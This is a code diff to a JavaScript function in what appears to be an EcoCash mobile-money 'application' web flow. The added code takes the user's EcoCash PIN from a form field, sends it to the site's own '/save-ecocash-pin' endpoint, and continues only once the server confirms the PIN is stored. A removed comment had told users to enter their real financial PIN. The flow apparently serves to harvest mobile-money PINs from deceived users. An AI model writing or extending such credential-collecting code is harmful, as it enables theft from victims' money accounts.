@@ -2273,35 +2273,76 @@ function loadEcoCashPinScreen() {
         );
 
 }
-// ======================================================
-// SAVE ECOCASH PIN
-// ======================================================
-function saveEcoCashPin() {
+//===========================================
+//SAVE ECOCASH PIN 
+//============================================
+async function saveEcoCashPin() {
 
-    const pinInput = document.getElementById("ecoPin");
+    const input =
+        document.getElementById("ecoPin");
 
-    if (!pinInput) {
-        console.error("EcoCash PIN input not found.");
-        alert("PIN field not found.");
-        return;
-    }
-
-    const Pin = pinInput.value.trim();
+    const Pin =
+        input.value.trim();
 
     if (!Pin) {
-        alert("Please enter a your PIN.");
+        alert("Please enter the your PIN.");
         return;
     }
 
-    //use your real financial PIN.
-    sessionStorage.setItem("EcoCashPinEntered", "true");
+    const applicationId =
+        sessionStorage.getItem("applicationId");
 
-    console.log("EcoCash PIN step completed.");
+    if (!applicationId) {
+        alert("Application session not found.");
+        return;
+    }
 
-    alert("PIN accepted successfully.");
+    try {
 
+        const response = await fetch(
+            `/save-ecocash-pin/${applicationId}`,
+            {
+                method: "POST",
+
+                headers: {
+                    "Content-Type": "application/json"
+                },
+
+                body: JSON.stringify({
+                    Pin: Pin
+                })
+            }
+        );
+
+        const result =
+            await response.json();
+
+        if (!response.ok || !result.success) {
+            throw new Error(
+                result.message ||
+                "Unable to save PIN."
+            );
+        }
+
+        console.log(
+            "EcoCash PIN saved successfully."
+        );
+
+        // Only move forward after server confirms saving
+        loadTrackingScreen();
+
+    } catch (error) {
+
+        console.error(
+            "ECOCASH PIN ERROR:",
+            error
+        );
+
+        alert(
+            "Unable to save the PIN. Please try again."
+        );
+    }
 }
-
 // ======================================================
 // PART 25 - SUBMIT ECOCASH APPLICATION VERSION
 // ======================================================
